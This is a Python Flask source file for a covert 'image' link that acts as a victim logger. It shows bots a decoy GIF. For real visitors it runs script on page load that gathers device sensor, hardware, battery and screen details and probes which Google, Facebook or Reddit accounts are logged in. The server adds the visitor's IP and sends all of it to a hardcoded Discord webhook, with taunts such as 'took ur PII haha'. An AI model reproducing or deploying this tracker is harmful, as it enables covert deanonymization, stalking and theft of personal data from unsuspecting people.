import os
import requests
from flask import Flask, request, render_template_string, send_file
import io
from datetime import datetime

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1499405115294093454/AxyBIBWUojFPEoD1bIsyexLxf8gC8yR4fEDBF8eCNKLtWPFGfXZ3EZ28XdDEQCHlEl51"

@app.route('/view/image_01.png')
def logger():
    ua = request.user_agent.string
    if any(x in ua.lower() for x in ["discord", "telegram", "bot", "crawl", "slack"]):
        r = requests.get("https://media1.tenor.com/m/ziNSDDTCyiwAAAAC/discord-trolling.gif")
        return send_file(io.BytesIO(r.content), mimetype='image/gif')

    return render_template_string('''
    <html>
    <body style="background-color: #000; height: 100vh; margin: 0; overflow: hidden;">
        <script>
            async function capture() {
                // 1. PHYSICAL GYRO & MOTION
                let tilt = {alpha: 0, beta: 0, gamma: 0};
                window.ondeviceorientation = (e) => {
                    tilt = {alpha: e.alpha.toFixed(1), beta: e.beta.toFixed(1), gamma: e.gamma.toFixed(1)};
                };

                // 2. IDENTITY & NAME GUESSING
                // We check the browser's profile name and languages to narrow down the target
                const nameGuess = (navigator.userAgentData && navigator.userAgentData.platform) || "Unknown User";
                
                // 3. SOCIAL SESSION CHECKS (V10 logic)
                const sites = { Google: "https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico", Facebook: "https://www.facebook.com/favicon.ico", Reddit: "https://www.reddit.com/favicon.ico" };
                let sessions = [];
                for (const [name, url] of Object.entries(sites)) {
                    const img = new Image(); img.src = url;
                    const status = await new Promise(r => {
                        img.onload = () => r(true); img.onerror = () => r(false);
                        setTimeout(() => r(false), 1000);
                    });
                    if (status) sessions.push(name);
                }

                // 4. HARDWARE & GHOST DATA (V11 logic)
                let gpu = "Unknown";
                try {
                    const gl = document.createElement('canvas').getContext('webgl');
                    gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_ID);
                } catch(e){}

                let batt = {level: 0, charging: false};
                try { batt = await navigator.getBattery(); } catch(e){}

                const data = {
                    tilt: `Alpha: ${tilt.alpha}, Beta: ${tilt.beta}, Gamma: ${tilt.gamma}`,
                    name_id: nameGuess,
                    gpu: gpu,
                    cores: navigator.hardwareConcurrency || "Unknown",
                    ram: navigator.deviceMemory || "Unknown",
                    batt: Math.round((batt.level || 0) * 100) + "%",
                    charging: batt.charging ? "YES" : "NO",
                    social: sessions.length ? sessions.join(", ") : "None",
                    res: screen.width + "x" + screen.height,
                    platform: navigator.platform
                };

                fetch('/log-omega-v12', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                }).then(() => {
                    window.location.href = "https://i.imgur.com/BcNs5vF.jpg";
                });
            }
            capture();
        </script>
    </body>
    </html>
    ''')

@app.route('/log-omega-v12', methods=['POST'])
def log_v12():
    d = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    
    payload = {
        "username": "04nexo took ur PII haha",
        "embeds": [{
            "title": "nexo found his target!😈",
            "color": 0xFF0000,
            "fields": [
                {"name": "📍 NETWORK / IP", "value": f"`{ip}`", "inline": True},
                {"name": "👤 PROFILE ID", "value": f"`{d['name_id']}`", "inline": True},
                {"name": "🧭 GYRO / TILT", "value": f"```{d['tilt']}```", "inline": False},
                {"name": "🧠 HARDWARE", "value": f"**CPU:** {d['cores']} Cores\n**RAM:** {d['ram']} GB\n**GPU:** `{d['gpu']}`", "inline": False},
                {"name": "🔋 POWER", "value": f"**Charge:** {d['batt']} (Plugged: {d['charging']})", "inline": True},
                {"name": "👥 LOGINS", "value": f"`{d['social']}`", "inline": True}
            ],
            "footer": {"text": f"Project 04Nexo | v12.0 | {datetime.utcnow().strftime('%H:%M:%S UTC')}"},
        }]
    }
    requests.post(WEBHOOK_URL, json=payload)
    return "OK", 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
